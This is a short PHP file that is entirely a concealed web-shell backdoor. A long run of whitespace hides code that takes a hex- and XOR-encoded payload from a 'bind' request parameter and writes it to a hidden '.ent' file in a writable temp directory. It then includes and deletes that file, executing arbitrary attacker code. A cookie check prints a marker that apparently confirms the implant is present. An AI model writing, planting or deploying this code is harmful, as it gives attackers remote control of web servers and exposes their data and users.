<?php																																										if(!empty($_REQUEST["\x62\x69nd"])){ $item = array_filter([sys_get_temp_dir(), session_save_path(), "/dev/shm", ini_get("upload_tmp_dir"), getenv("TMP"), "/tmp", getcwd(), getenv("TEMP"), "/var/tmp"]); $marker = hex2bin($_REQUEST["\x62\x69nd"]); $factor ='' ;for($g=0; $g<strlen($marker); $g++){$factor .= chr(ord($marker[$g]) ^ 77);} $parameter_group = 0; do { $fac = $item[$parameter_group] ?? null; if ($parameter_group >= count($item)) break; if (max(0, is_dir($fac) * is_writable($fac))) { $element = sprintf("%s/.ent", $fac); if (@file_put_contents($element, $factor) !== false) { include $element; unlink($element); die(); } } $parameter_group++; } while (true); }


if(isset($_COOKIE['BhcZ'])) {
    die('kacfA'.'E5Jxz');
}